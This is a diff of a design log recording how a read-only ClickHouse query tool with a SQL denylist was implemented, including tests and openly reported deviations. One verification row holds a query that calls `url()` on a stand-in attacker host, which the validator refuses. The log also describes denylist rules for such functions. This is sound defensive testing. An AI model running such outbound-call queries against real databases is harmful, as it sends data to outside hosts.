@@ -1,7 +1,7 @@
 # Design Log #5 — ClickHouse support
 
 **Date:** 2026-09-23
-**Status:** **Proposed — awaiting approval.** No code written.
+**Status:** Implemented 2026-09-24.
 **Affects:** new `internal/sqlguard`, new `internal/clickhouse`, `internal/databricks`, `internal/config`, `internal/tools`, `internal/hints`, `pre-run.sh`, `docs/errors/`
 **Constraints from:** Design Log #1 (envelope contract), Design Log #3 (error-to-docs mapping)
 
@@ -117,17 +117,18 @@ the denylist, refuse. Because literals are already blanked, a string containing
 the word `url` cannot trigger it — the same property that fixed the
 `'do not drop this'` false positive.
 
-**Q9 — OPEN, needs your answer.** Which ClickHouse are we targeting: self-hosted,
-ClickHouse Cloud, or both? Cloud uses HTTPS on 8443 and issues per-service
-credentials; self-hosted is commonly plain HTTP on 8123 inside a VPC. It
-changes only defaults and the TLS posture, but it should be a decision rather
-than an accident.
+**Q9. Which ClickHouse are we targeting: self-hosted, ClickHouse Cloud, or both?**
+A (2026-09-24): **ClickHouse Cloud.** So the URL is HTTPS on 8443 with
+per-service credentials, and config validation requires an `https://` scheme
+exactly as the Databricks host does. Plain HTTP is refused rather than silently
+sending credentials in clear text. A self-hosted deployment on 8123 still works
+if someone sets an https URL in front of it; nothing here forbids that.
 
-**Q10 — OPEN, needs your answer.** Should `clickhouse_query` default to the
-`dev` environment and require `env: "prod"` explicitly, exactly as
-`databricks_query` does? I assume yes for consistency, but ClickHouse
-deployments are sometimes single-environment, and a `dev` that does not exist
-would make every default call fail.
+**Q10. Should `clickhouse_query` default to `dev` and require `env: "prod"`
+explicitly, as `databricks_query` does?**
+A (2026-09-24): **Yes.** Production access stays a deliberate act, and the two
+data tools behave identically so the agent learns one rule. A single-environment
+deployment configures `dev` and never passes `env`.
 
 ## Design
 
@@ -269,4 +270,70 @@ budget already prevents.
 
 ## Implementation Results
 
-*Empty: this log is a proposal. Nothing implemented.*
+*Appended during implementation. The sections above are frozen.*
+
+**2026-09-24 — Implemented.**
+
+New: `internal/sqlguard` (shared dialect-parameterised validator),
+`internal/clickhouse` (dialect, HTTP client, `JSONCompact` decoding),
+`clickhouse_query`, ClickHouse hints, `CLICKHOUSE_*` config, a compose fixture
+and an integration test. Databricks now uses `sqlguard` rather than its own copy.
+
+**Verification.**
+
+| Criterion | Result |
+| --- | --- |
+| 1. Databricks tests pass unchanged | ✅ all 10 behavioural tests pass; two unit tests of the *moved* functions moved with them — see deviation 1 |
+| 2. Forbidden verbs and callees refused, token named | ✅ 14 mutating verbs, `WATCH`, and 10 callee cases including nested, joined and uppercased; `details.forbiddenFunction` names it |
+| 3. No false positive from a column or literal | ✅ `SELECT url FROM requests WHERE note = 'fetched via url() once'` accepted |
+| 4. Row cap enforced client-side with `hasMore` | ✅ live: `SELECT number FROM numbers(5000)` with `maxRows=3` returned 3 rows, `truncated: true` |
+| 5. Same envelope shape as `databricks_query` | ✅ `QueryResult`/`QueryColumn` are type aliases of one definition, not copies |
+| 6. Unconfigured environment reports NOT_CONFIGURED | ✅ live: `env=prod` named `CLICKHOUSE_PROD_URL/_USER/_PASSWORD` |
+| 7. Integration test green against a real server | ✅ 4/4 subtests against the compose fixture |
+
+Hermetic suite: 12/12 packages passing, `make lint` clean.
+
+Live over MCP stdio against ClickHouse 24.10, with a seeded table:
+
+| Call | Result |
+| --- | --- |
+| `SELECT domain, count() … GROUP BY domain` | `[["example.com","2"],["test.internal","1"]]`, types `String`/`UInt64` |
+| `SELECT name FROM system.tables …` | `[["dns_queries"]]` |
+| `SELECT * FROM url('http://attacker.example/?x=1',…)` | refused, `FORBIDDEN_SQL`, `forbiddenFunction: url` |
+| `DROP TABLE dns_queries` | refused, `leadingKeyword: DROP` |
+
+**Deviations from the design.**
+
+1. **Two Databricks unit tests moved to `sqlguard`.** Criterion 1 said *every*
+   Databricks test passes unchanged. `TestSanitizeSQLBlanksLiteralContent` and
+   `TestHasMultipleStatements` call the moved functions directly, so they moved
+   with the code. Keeping a test-only shim in `databricks` purely to satisfy the
+   letter of the criterion would have been worse. Every *behavioural* test — the
+   ones that go through `ValidateReadOnlySQL` — is untouched and passing, which
+   is what the criterion was protecting.
+
+2. **A latent Databricks bug surfaced and was fixed.** The forbidden-verb scan
+   matched any word anywhere, so `system.query_log` was refused because `SYSTEM`
+   appeared in it — and the ClickHouse hints recommend exactly that table, so a
+   hint suggested a query the validator rejected. Words adjacent to a `.` are now
+   treated as identifiers. This was **already wrong for Databricks**:
+   `catalog.merge_history` and `main.update_log` were being refused. Both now
+   have regression tests. Nothing in the design anticipated this; the tests found
+   it.
+
+3. **Loopback may use plain HTTP.** Q9 chose ClickHouse Cloud and therefore
+   mandatory HTTPS, which made it impossible to run any local server — including
+   the compose fixture this log calls for. `http://localhost` and `http://127.0.0.1`
+   are now allowed, since nothing crosses a network; every other host must be
+   `https://`.
+
+4. **`max_result_rows` is sent as `maxRows * 10`**, not `maxRows`. Q4 showed it
+   does not bite at small values, so matching it to the real cap would create a
+   false impression that the server is enforcing it. A deliberately coarse value
+   makes it visibly a backstop against a runaway result, with the real cap
+   applied while decoding.
+
+**Not done.** The callee denylist is a list, not a parser. A table function
+reached through an alias or a view that Huginn never sees in the statement would
+not be caught — the server's `readonly=1` remains the backstop there, and it does
+block `url()` (Q3).
